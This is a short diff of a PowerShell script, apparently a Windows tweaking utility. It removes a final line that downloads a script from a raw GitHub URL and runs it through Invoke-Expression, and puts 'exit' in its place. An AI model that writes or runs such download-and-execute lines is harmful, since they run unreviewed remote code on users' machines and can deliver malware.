@@ -226,6 +226,4 @@ Start-Sleep -Seconds 2
 
 Write-Host "Script execution completed. Press Enter to exit."
 Read-Host
-
-# Execute additional script
-Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/emreuls7/mr.winls/pasha/pc.ps1").Content
+exit
